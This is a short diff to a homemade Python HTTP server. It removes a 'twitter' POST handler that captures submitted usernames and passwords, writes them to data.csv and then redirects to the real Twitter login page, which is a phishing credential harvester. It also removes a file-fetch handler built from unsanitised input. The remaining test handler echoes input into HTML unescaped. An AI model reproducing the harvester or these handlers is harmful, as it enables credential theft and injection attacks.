@@ -12,27 +12,12 @@ bind_port = 80
 
 print("bindIP: %s  bindPORT: %d\n" % (bind_ip, bind_port))
 
-def twitter(params):
-    params = params[-1].split("&")
-    username=params[0][params[0].find("=")+1:]
-    password=params[1][params[1].find("=")+1:]
-    print("____Username____ : %s" % username)
-    print("____Password____ : %s" % password)
-    f = open("data.csv", "a")
-    f.write(username + "," + password + "\n")
-    f.close()
-    return("<META HTTP-EQUIV=\"Refresh\" CONTENT=\"0; URL=https://twitter.com/login\">", "text/html")
-
 def post_test(params):
     params = params[-1].split("&")
     buf = ""
     for line in params:
         buf += "<p>" + line + "</p>"
     return(buf, "text/html")
-
-def get_text(params):
-    params = params[-1].split("=")
-    return(GET(["HTTP /text/" + params[-1] + ".txt"]))
 
 def make_http_header(status="200 OK", server="Server", Accept_Ranges="bytes", Content_Length="0", Keep_Alive="timeout=15, max=100", Content_Type="media/binary"):
     return("HTTP/1.1 " + status + \
@@ -112,8 +97,7 @@ media_list = {
     }
     
 post_list = {
-    "test.post":post_test,
-    "twitter.post" :twitter
+    "test.post":post_test
     }
 
 main()
